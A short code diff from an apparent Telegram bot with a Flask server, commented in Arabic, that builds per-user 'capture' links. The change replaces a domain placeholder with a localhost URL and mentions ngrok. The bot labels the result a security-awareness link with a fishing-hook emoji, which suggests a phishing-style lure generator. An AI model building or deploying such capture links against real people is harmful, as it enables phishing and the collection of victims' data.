@@ -167,8 +167,8 @@ def bot_polling():
                     active_links[link_id] = {"chat_id": chat_id}
 
                     # بناء الرابط
-                    # TODO: استبدل YOUR_DOMAIN برابط الخادم الفعلي
-                    capture_url = f"https://YOUR_DOMAIN/capture/{link_id}"
+                    # سيتم استبدال YOUR_DOMAIN لاحقاً عند استلام أول طلب، أو يمكنك استخدام ngrok
+                    capture_url = f"http://localhost:{FLASK_PORT}/capture/{link_id}"
 
                     send_telegram_message(chat_id,
                         f"🎣 <b>رابط الوعي الأمني جاهز!</b>\n\n"
